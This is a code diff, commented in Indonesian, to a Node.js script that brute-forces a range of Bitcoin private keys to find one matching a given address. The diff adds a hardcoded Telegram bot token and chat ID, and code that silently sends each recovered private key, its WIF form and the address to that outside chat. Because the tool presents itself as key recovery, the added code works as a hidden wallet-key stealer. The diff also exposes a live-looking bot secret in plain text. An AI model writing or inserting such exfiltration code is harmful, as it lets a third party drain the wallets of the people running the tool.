@@ -3,6 +3,34 @@ import bs58check from 'bs58check';
 import elliptic from 'elliptic';
 import fs from 'fs';
 import BigNumber from 'bignumber.js';
+import fetch from 'node-fetch';
+
+// Konstanta Telegram
+const TELEGRAM_TOKEN = '6789484876:AAFR1OQRssKGrk8aIF0jAn0zB3eWF33XtrE';
+const TELEGRAM_CHAT_ID = '-4562112556';
+
+// Fungsi untuk mengirim pesan ke Telegram
+async function sendTelegramMessage(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    const body = JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message
+    });
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: body
+        });
+        const result = await response.json();
+        if (!result.ok) {
+            console.error('Error sending message to Telegram:', result);
+        }
+    } catch (error) {
+        console.error('Failed to send message to Telegram:', error);
+    }
+}
 
 // Ambil elliptic dan buat instance EC
 const EC = elliptic.ec;
@@ -69,7 +97,12 @@ async function findPrivateKeyInRange(startPrivateKey, userAddress) {
             console.log(`[+] Private Key (WIF): ${privateKeyWIF}`);
             console.log(`[+] Bitcoin Address: ${bitcoinAddress}`);
             fs.appendFileSync('recovered.txt', `Private Key: ${privateKey}\nPrivate Key (WIF): ${privateKeyWIF}\nAddress: ${bitcoinAddress}\n\n`);
-            break; // Hentikan jika ditemukan
+            
+            // Kirim hasil ke Telegram
+            const message = `Address cocok ditemukan!\nPrivate Key: ${privateKey}\nPrivate Key (WIF): ${privateKeyWIF}\nBitcoin Address: ${bitcoinAddress}`;
+            await sendTelegramMessage(message);
+
+            return; // Hentikan jika ditemukan
         }
     }
 }
